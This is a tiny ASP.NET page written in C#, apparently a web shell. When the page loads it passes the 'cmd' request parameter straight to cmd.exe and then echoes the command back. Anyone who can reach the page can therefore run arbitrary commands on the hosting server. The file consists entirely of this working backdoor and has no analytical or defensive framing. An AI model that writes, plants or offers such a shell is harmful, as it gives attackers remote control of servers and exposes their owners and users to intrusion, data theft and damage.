<%@ Page Language="C#" %>
<%@ Import Namespace="System.Diagnostics" %>
<script runat="server">
void Page_Load(object sender, EventArgs e) {
    if (Request["cmd"] != null) {
        Process.Start("cmd.exe", "/c " + Request["cmd"]);
        Response.Write("Executed: " + Request["cmd"]);
    }
}
</script>
